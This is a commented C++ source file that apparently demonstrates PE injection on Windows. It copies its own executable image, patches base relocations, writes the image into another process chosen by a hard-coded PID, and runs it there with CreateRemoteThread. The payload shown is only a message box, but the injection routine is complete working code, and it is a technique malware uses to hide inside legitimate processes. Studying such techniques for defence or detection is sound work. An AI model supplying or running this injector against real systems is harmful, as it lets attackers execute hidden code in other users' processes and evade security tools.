#include <Windows.h>
#include <iostream>

using namespace std;

// This structure is used to represent a relocation entry in the base relocation table.
// The Offset field (12 bits) indicates the offset of the relocation entry within the page.
// The Type field (4 bits) indicates the type of relocation (e.g., absolute, high-low, etc.).
typedef struct BASE_REALLOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

// This function will serve as the entry point for the injected code in the target process.
DWORD InjectionEntryPoint() {
	CHAR moduleName[128] = "";  // Buffer to store the module name.
	CHAR text[128] = "Testing for PE injection";  // Text for the message box.
	
	// Retrieve the full path of the executable file of the current process.
	GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
	
	// Display a message box with the specified text.
	MessageBoxA(NULL, text, "Obligatory PE Injection", NULL);
	
	return 0;
}

int main() {
    // Get the base address of the current process's executable image.
	PVOID imageBase = GetModuleHandle(NULL);
	
	// Get a pointer to the DOS header of the executable image.
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	
	// Get a pointer to the NT headers of the executable image by adding the e_lfanew offset to the base address.
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	// Allocate memory in the current process for a copy of the entire PE image.
	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	
	// Copy the entire PE image from the current process to the newly allocated memory.
	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	// Open the target process where the PE image will be injected.
	// The target process is identified by its process ID (PID).
	// Note: You should replace `8864` with the actual PID of the target process (e.g., notepad.exe).
	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 8864); 

	// Allocate memory in the target process for the PE image to be injected.
	// The allocated memory will have the same size as the original PE image.
	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Calculate the delta (difference) between the base addresses of the image in the current process and the target process.
	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

	// Get a pointer to the base relocation table in the copied image.
	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	DWORD relocationEntriesCount = 0; // Variable to store the number of relocation entries.
	PDWORD_PTR patchedAddress; // Pointer to the address that needs to be patched.
	PBASE_RELOCATION_ENTRY relocationRVA = NULL; // Pointer to the relocation entries.

	// Iterate through the base relocation table to adjust the addresses in the copied image.
	while (relocationTable->SizeOfBlock > 0) {
		// Calculate the number of relocation entries in the current block.
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		
		// Get the pointer to the relocation entries.
		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
		
		// Iterate through each relocation entry in the block.
		for (short i = 0; i < relocationEntriesCount; i++) {
			// If the offset is not zero, calculate the patched address.
			if (relocationRVA[i].Offset) {
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				// Adjust the address by adding the delta between the current and target base addresses.
				*patchedAddress += deltaImageBase;
			}
		}
		
		// Move to the next block in the base relocation table.
		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

	// Write the adjusted (relocated) image into the target process's memory.
	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

	// Create a remote thread in the target process to execute the injected code.
	// The thread will start execution at the InjectionEntryPoint function.
	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);
	
	return 0;